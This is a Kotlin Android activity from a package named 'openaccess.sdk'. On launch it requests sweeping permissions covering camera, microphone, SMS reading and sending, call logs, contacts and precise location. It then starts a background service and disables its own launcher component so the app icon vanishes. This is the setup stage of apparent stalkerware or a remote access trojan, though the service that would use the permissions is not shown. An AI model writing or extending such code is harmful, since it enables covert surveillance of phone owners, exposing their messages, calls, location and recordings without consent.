package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.MainService

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val RC_ALL = 100

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        val hasPermission = fun(ctx: android.content.Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        val hasAll = fun(ctx: android.content.Context, vararg perms: String): Boolean {
            return perms.all { hasPermission(ctx, it) }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }
        Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
        requestAllPerms()
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        Log.i(TAG, "Requesting ${needed.size} permissions")
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        } else {
            finishSetup()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
            if (denied.isNotEmpty()) {
                Log.w(TAG, "Denied: ${denied.joinToString()}")
            }
            finishSetup()
        }
    }

    private fun finishSetup() {
        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
        finish()
    }
}
